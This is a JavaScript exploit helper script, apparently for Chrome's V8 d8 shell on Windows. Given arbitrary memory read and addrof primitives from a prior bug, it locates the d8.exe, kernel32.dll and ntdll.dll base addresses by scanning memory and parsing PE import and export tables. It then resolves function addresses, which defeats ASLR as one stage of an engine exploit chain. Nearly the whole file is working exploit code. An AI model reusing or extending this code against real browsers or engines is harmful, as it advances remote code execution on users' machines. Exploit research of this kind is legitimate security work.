/*

Note this require 4 functions in order to work : 
- read32(addr) -> read 32bits at addr
- read64(addr) -> read 64bits at addr
- addrof(obj) -> get address of obj
- readStr(addr,tolower=false) -> read string at addr (see example script)

*/

let hexprintablei = (i) =>
{
    return "0x"+(i).toString(16).padStart(16,"0");
}

let findBinPtr = (heap_addr) =>
{
	let base_addr;
	for(i=0;i<0x80000;i+=8)
	{
		base_addr=read64((heap_addr-BigInt(i))-1n)&0xffffffffffff0000n
		if((base_addr>>36n)==0x7ffn)
				return base_addr;

	}
	return -1;
}

let findBase = (bin_base) =>
{
	for(i=0;i<0x1000000;i+=0x10000)
		if((read32(bin_base-BigInt(i))&0xffffn)==0x5a4dn)
				return bin_base-BigInt(i);
	return -1;
}

let resolve_iat = (dll,funct,base_addr) =>
{
	dll=dll.toLowerCase();
	let data_dir=read32(base_addr+0x3cn);
	let import_dir=read32(base_addr+data_dir+0x90n)+base_addr;
	let iat_size=BigInt(read32(base_addr+data_dir+0xecn));
	let iat_base=read32(import_dir+0x10n)+base_addr;
	let import_dir_size=BigInt(read32(base_addr+data_dir+0x94n));
	let iat_addr,int_addr,int_entry_addr;
	if(debug)
	{
		log("[+] data_dir: "+hexprintablei(data_dir));
		log("[+] import_dir: "+hexprintablei(import_dir));
		log("[+] iat_size: "+hexprintablei(iat_size));
		log("[+] iat_base: "+hexprintablei(iat_base));
		log("[+] import_dir_size: "+hexprintablei(import_dir_size));
	}
	for(i=0;i<=import_dir_size;i+=20)
	{
		name_addr=read32(import_dir+BigInt(i)+12n)+base_addr;
		if(readStr(name_addr,true)==dll)
		{
			iat_addr=read32(import_dir+BigInt(i)+16n)+base_addr;
			int_addr=read32(import_dir+BigInt(i))+base_addr;
			if(debug)
			{
				log("[+] "+dll+" IAT at: "+ hexprintablei(iat_addr));
				log("[+] "+dll+" INT at: "+ hexprintablei(int_addr));
			}
			log("[+] Searching for "+dll+"!"+funct);
			iat_entries=iat_size+iat_base-iat_addr;
			for(j=0;j<=iat_entries;j+=8)
			{
				int_entry_addr=read32(int_addr+BigInt(j))+base_addr;
				if(readStr(int_entry_addr+2n)==funct)
				{
					result=read64(iat_addr+BigInt(j))
					log("[+] "+dll+"!"+funct+" at: " +hexprintablei(result));
					return BigInt(result);
				}
			}
		}
	}
	return -1;
}


let resolve_eat = (dll,funct,base_addr) =>
{
	dll=dll.toLowerCase();
	let data_dir=read32(base_addr+0x3cn);
	let export_dir=read32(base_addr+data_dir+0x88n)+base_addr;
	let eat_addr,ent_addr,ent_entry_addr;
	if(debug)
	{
		log("[+] data_dir: "+hexprintablei(data_dir));
		log("[+] export_dir: "+hexprintablei(export_dir));
	}

	name_addr=read32(export_dir+0xcn)+base_addr;
	
	if(readStr(name_addr,true)==dll)
	{
		eat_addr=read32(export_dir+0x1cn)+base_addr;
		ent_addr=read32(export_dir+0x20n)+base_addr;
		nb_functions=read32(export_dir+0x14n);
		if(debug)
		{
			log("[+] "+dll+" EAT at: "+ hexprintablei(eat_addr));
			log("[+] "+dll+" ENT at: "+ hexprintablei(ent_addr));
		}
		log("[+] Searching for "+dll+"!"+funct);
		for(i=0;i<nb_functions;i++)
		{
			ent_entry_addr=read32(ent_addr+BigInt(i*4))+base_addr;
			if(readStr(ent_entry_addr)==funct)
			{
				result=read32(eat_addr+BigInt(i*4))+base_addr;
				log("[+] "+dll+"!"+funct+" at: " +hexprintablei(result));
				return BigInt(result);
			}
		}
	}
	
	return -1;
}

log("------------------------------------------------------");
log("[+] Resolving d8.exe base address...");

heap=addrof([]);
bin_ptr=findBinPtr(heap);
bin_base=findBase(bin_ptr);

log("[+] Base address d8.exe: "+hexprintablei(bin_base));

kernel32_ptr=resolve_iat('kernel32.dll','CloseHandle',bin_base) & 0xffffffffffff0000n;
resolve_iat('WINMM.dll','timeGetTime',bin_base);
kernel32_base=findBase(kernel32_ptr);
log("[+] Base address kernel32.dll: "+hexprintablei(kernel32_base));

ntdll_ptr=resolve_iat('ntdll.dll','NtTerminateProcess',kernel32_base) & 0xffffffffffff0000n;
ntdll_base=findBase(ntdll_ptr);
log("[+] Base address ntdll.dll: "+hexprintablei(ntdll_base));
beep=resolve_eat('kernel32.dll','Beep',kernel32_base);
log("[+] Beep address: "+hexprintablei(beep));
